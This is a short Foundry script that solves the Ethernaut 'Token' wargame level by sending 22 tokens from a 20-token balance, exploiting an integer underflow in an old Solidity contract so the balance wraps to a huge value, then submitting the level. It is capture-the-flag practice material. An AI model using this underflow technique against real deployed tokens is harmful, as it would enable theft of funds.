// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Token} from "../src/Level05.sol";

contract Level05 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Token instance = Token(vm.envAddress("LVL05_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        instance.transfer(address(instance), 22);
        if (instance.balanceOf(me) > 20) {
            console2.log("Level05: Success");
            ethernaut.submitLevelInstance(address(instance));
        }

        vm.stopBroadcast();
    }
}
